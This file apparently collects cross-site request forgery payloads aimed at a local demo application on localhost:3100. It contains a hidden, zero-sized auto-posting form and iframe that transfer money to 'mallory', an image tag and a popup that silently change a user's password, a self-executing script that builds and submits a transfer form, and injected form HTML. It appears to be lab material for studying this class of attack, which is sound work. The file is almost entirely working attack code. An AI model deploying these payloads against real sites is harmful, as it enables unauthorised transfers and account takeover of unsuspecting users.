
<div id="attackDiv">
    <style>
        #attackDiv * {width: 0px; height: 0px; opacity: 0}
    </style>
    <form method="post" action="http://localhost:3100/transfer" target="secretFrame">
        <input type="hidden" name="transferTo" value="mallory">
            <input type="hidden" name="amount" value="400">
                <input type="submit">
    </form>
    <iframe id="secretFrame"></iframe>
</div>
<img src="http://localhost:3100/changePassword?new=12345">

    (function transferFunds(){var frm=document.createElement('FORM');
    frm.name='myForm';
    frm.method='POST';
    frm.action='http://localhost:3100/transfer';

    var elem1=document.createElement('INPUT');
    elem1.type='HIDDEN';
    elem1.name='transferTo';
    elem1.value='mallory';
    frm.appendChild(elem1);

    var elem2=document.createElement('INPUT');
    elem2.type='HIDDEN';
    elem2.name='amount';
    elem2.value='300';
    frm.appendChild(elem2);

    document.body.appendChild(frm);
    frm.submit();
})();
//Inject form GET
var vct='
<form name="frmGet" method="GET" action="http://localhost:3100/changePassword">'+
    '<input type="hidden" name="new" value="123"/></form>
'
$('#targetDiv').append(vct);

//open popup
window.open("http://localhost:3100/changePassword?new=234");
